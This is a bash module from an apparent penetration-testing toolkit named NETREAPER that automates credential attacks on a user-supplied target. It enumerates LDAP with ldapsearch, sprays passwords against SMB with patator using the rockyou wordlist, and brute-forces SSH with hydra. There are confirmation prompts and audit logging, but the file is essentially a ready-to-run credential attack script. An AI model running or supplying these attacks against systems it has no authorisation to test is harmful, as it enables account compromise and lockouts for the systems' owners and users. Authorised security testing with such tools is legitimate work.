#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════════════════
# NETREAPER - Credential Hunting Wizard
# ═══════════════════════════════════════════════════════════════════════════════
# Copyright (c) 2025 Nerds489
# SPDX-License-Identifier: Apache-2.0
#
# Credential hunting wizard: SMB/LDAP enumeration → password spraying → brute-force attacks
# ═══════════════════════════════════════════════════════════════════════════════

# Prevent multiple sourcing
[[ -n "${_NETREAPER_CREDS_WIZARD_LOADED:-}" ]] && return 0
readonly _NETREAPER_CREDS_WIZARD_LOADED=1

# Source library files
source "${BASH_SOURCE%/*}/../lib/core.sh"
source "${BASH_SOURCE%/*}/../lib/ui.sh"
source "${BASH_SOURCE%/*}/../lib/safety.sh"
source "${BASH_SOURCE%/*}/../lib/detection.sh"
source "${BASH_SOURCE%/*}/../lib/utils.sh"

#═══════════════════════════════════════════════════════════════════════════════
# CREDS WIZARD FUNCTIONS
#═══════════════════════════════════════════════════════════════════════════════

# Credential hunting wizard
run_creds_wizard() {
    local target="${1:-}"

    operation_header "Credential Hunting Wizard" "Automated workflow"

    # Step 1: Get target
    if [[ -z "$target" ]]; then
        target=$(get_target_input "Enter target IP or domain")
        if [[ -z "$target" ]]; then
            log_error "No target specified"
            return 1
        fi
    fi

    log_info "Starting credential hunting on: $target"
    echo

    # Step 2: SMB/LDAP Enumeration
    log_info "Step 1/3: SMB/LDAP Enumeration"
    log_info "This enumerates SMB shares and LDAP users/groups."
    if ! confirm "Proceed with SMB/LDAP enumeration?" "y"; then
        log_info "Enumeration skipped"
    else
        run_smb_enum "$target"
        run_ldap_enum "$target"
    fi
    echo

    # Step 3: Password Spraying
    log_info "Step 2/3: Password Spraying"
    log_info "This attempts common passwords against discovered accounts."
    if ! confirm "Proceed with password spraying? (May lock accounts)" "n"; then
        log_info "Password spraying skipped"
    else
        run_password_spray "$target"
    fi
    echo

    # Step 4: Brute-Force Attacks
    log_info "Step 3/3: Brute-Force Attacks"
    log_info "This performs brute-force attacks on discovered services."
    if ! confirm "Proceed with brute-force attacks? (May trigger IDS/locks)" "n"; then
        log_info "Brute-force attacks skipped"
    else
        run_brute_force "$target"
    fi
    echo

    operation_summary "success" "Credential hunting wizard complete" "Review outputs in $OUTPUT_DIR"
    log_audit "CREDS_WIZARD" "$target" "success"
}

# LDAP enumeration
run_ldap_enum() {
    local target="$1"

    if ! check_tool "ldapsearch"; then
        log_error "ldapsearch is not installed"
        log_info "Install: sudo apt install ldap-utils"
        return 1
    fi

    local outfile
    outfile="${OUTPUT_DIR}/ldap_enum_${target}_$(timestamp_filename).txt"

    operation_header "LDAP Enumeration" "$target"
    log_command_preview "ldapsearch -x -h \"$target\" -b \"\" -s base"
    log_info "Enumerating LDAP directory..."

    ldapsearch -x -h "$target" -b "" -s base | tee "$outfile"
    local exit_code=$?

    if [[ $exit_code -eq 0 ]]; then
        operation_summary "success" "LDAP enumeration complete" "Output: $outfile"
    else
        operation_summary "failed" "Enumeration failed"
    fi

    return $exit_code
}

# Password spraying with patator or similar
run_password_spray() {
    local target="$1"

    if ! check_tool "patator"; then
        log_error "patator is not installed"
        log_info "Install: sudo apt install patator"
        return 1
    fi

    local userlist="/usr/share/wordlists/metasploit/unix_users.txt"
    local passlist="/usr/share/wordlists/rockyou.txt"
    local outfile
    outfile="${OUTPUT_DIR}/password_spray_${target}_$(timestamp_filename).txt"

    operation_header "Password Spraying" "$target"
    log_command_preview "patator smb_login host=\"$target\" user=FILE0 password=FILE1 0=\"$userlist\" 1=\"$passlist\" -x ignore:fgrep='STATUS_LOGON_FAILURE'"
    log_info "Spraying passwords..."

    patator smb_login host="$target" user=FILE0 password=FILE1 0="$userlist" 1="$passlist" -x ignore:fgrep='STATUS_LOGON_FAILURE' | tee "$outfile"
    local exit_code=$?

    if [[ $exit_code -eq 0 ]]; then
        operation_summary "success" "Password spraying complete" "Output: $outfile"
    else
        operation_summary "failed" "Spraying failed"
    fi

    return $exit_code
}

# Brute-force attacks on services
run_brute_force() {
    local target="$1"

    # Assume SSH brute force as example
    if ! check_tool "hydra"; then
        log_error "hydra is not installed"
        log_info "Install: sudo apt install hydra"
        return 1
    fi

    local userlist="/usr/share/wordlists/metasploit/unix_users.txt"
    local passlist="/usr/share/wordlists/rockyou.txt"
    local outfile
    outfile="${OUTPUT_DIR}/brute_force_${target}_$(timestamp_filename).txt"

    operation_header "Brute-Force Attack" "$target"
    log_command_preview "hydra -L \"$userlist\" -P \"$passlist\" \"$target\" ssh"
    log_info "Brute forcing SSH..."

    hydra -L "$userlist" -P "$passlist" "$target" ssh | tee "$outfile"
    local exit_code=$?

    if [[ $exit_code -eq 0 ]]; then
        operation_summary "success" "Brute-force complete" "Output: $outfile"
    else
        operation_summary "failed" "Attack failed"
    fi

    return $exit_code
}

#═══════════════════════════════════════════════════════════════════════════════
# EXPORT FUNCTIONS
#═══════════════════════════════════════════════════════════════════════════════

export -f run_creds_wizard run_ldap_enum run_password_spray run_brute_force